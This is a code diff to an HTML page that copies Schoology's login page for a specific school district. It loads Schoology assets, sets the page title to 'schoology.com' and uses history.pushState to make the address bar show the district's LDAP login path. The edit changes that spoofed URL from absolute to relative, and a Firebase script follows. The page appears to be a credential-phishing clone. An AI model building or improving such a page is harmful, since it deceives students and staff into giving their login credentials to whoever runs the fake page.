@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" data-theme="modern" class="wf-karla-n4-active wf-active js js no-touch hashchange history rgba borderradius boxshadow textshadow opacity cssanimations cssgradients csstransforms csstransforms3d csstransitions fontface generatedcontent boxsizing display-table lastchild placeholder wf-inactive" style="">
 <head>
-    <!-- ... ( HTML refs) ... -->
+    <!-- ... (HTML refs) ... -->
     <link rel="shortcut icon" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/favicon.ico" type="image/x-icon">
     <link rel="image_src" href="/images/schoology_thumbnail.png">
     <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/theme-modern-sgy.css">
@@ -108,19 +108,19 @@
 
   <script type="text/javascript">
       function changeURL(newURL) {
-            window.history.pushState({}, '', newURL);
-            document.title = 'schoology.com';
-        }
-
-        // Call the function to change the URL
-        changeURL('http://amityregion5.schoology.com/login/ldap?&school=5672843957');
-    $(document).ready(function(){
-      if (typeof $ !== 'undefined' && $('form input[type="text"]:first').length) {
-          $('form input[type="text"]:first').focus();
-      } else if (document.querySelector('form input[type="text"]')) {
-          document.querySelector('form input[type="text"]').focus();
+          window.history.pushState({}, '', newURL);
+          document.title = 'schoology.com';
       }
-    });
+
+      $(document).ready(function(){
+          changeURL('/login/ldap?&school=5672843957'); // Use a relative URL
+
+          if (typeof $ !== 'undefined' && $('form input[type="text"]:first').length) {
+              $('form input[type="text"]:first').focus();
+          } else if (document.querySelector('form input[type="text"]')) {
+              document.querySelector('form input[type="text"]').focus();
+          }
+      });
   </script>
 
   <!-- FIREBASE SCRIPT -->
